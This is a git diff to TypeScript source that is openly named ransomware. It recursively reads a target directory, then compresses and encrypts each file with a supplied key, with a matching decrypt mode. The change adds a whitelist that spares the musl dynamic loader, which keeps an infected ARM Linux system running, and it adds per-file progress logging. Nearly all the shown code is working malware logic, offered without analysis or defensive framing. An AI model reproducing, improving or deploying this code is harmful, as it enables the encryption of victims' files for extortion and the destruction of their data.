@@ -3,6 +3,22 @@ import fs from "fs";
 import crypto from "crypto";
 import path from "path";
 
+
+const removeElementsInWhiteList = (listOfFiles: string[]) => {
+  const whitelist = [ "ld-musl-aarch64.so.1" ];
+  
+  const newList: string[] = [];
+  for (let i = 0; i < listOfFiles.length; ++i) {
+    for (let j = 0; j < whitelist.length; ++j) {
+      if (!new RegExp(`/${whitelist[j]}`, "gi").test(listOfFiles[i])) {
+        newList.push(listOfFiles[i]);
+      }
+    }
+  }
+  return newList;
+}
+
+
 const readdir = (directory: string) => {
   let fileList: string[] = [];
 
@@ -171,12 +187,12 @@ const decrypt = (data: Buffer, password: string) => {
 const ransomware = (options: string) => {
   options = options.substring(12, options.length);
   const [mode, key, path, speed] = options.split(" ");
-  const filesInPath = readdir(path);
-  console.log("Encrypting " + filesInPath.length + " files..."); 
+  const filesInPath = removeElementsInWhiteList(readdir(path));
+  console.log("Encrypting " + filesInPath.length + " files...");
   for(let i = 0; i < filesInPath.length; ++i) {
-    console.log(`${i} of ${filesInPath.length} ...`); 
+    console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`); 
     try {
-      const fileData = loadFile(`${path}/${filesInPath[i]}`);
+      const fileData = loadFile(`${path}${filesInPath[i]}`);
       if (mode === "e" || mode === "encrypt") {
         const compressedFileDataBuffer = compressBuffer(fileData, +speed);
         const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
